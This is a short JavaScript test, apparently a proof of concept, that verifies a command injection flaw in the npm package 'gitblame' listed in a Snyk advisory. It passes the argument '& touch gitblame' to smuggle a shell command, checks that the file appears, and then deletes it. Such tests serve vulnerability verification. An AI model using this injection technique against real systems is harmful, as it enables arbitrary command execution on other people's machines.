//https://snyk.io/vuln/SNYK-JS-GITBLAME-1050430
test("Command Injection in gitblame", () => 
{
	const a =require("gitblame");	
	const fs = require('fs')
	const path = './gitblame'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a("& touch gitblame",function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
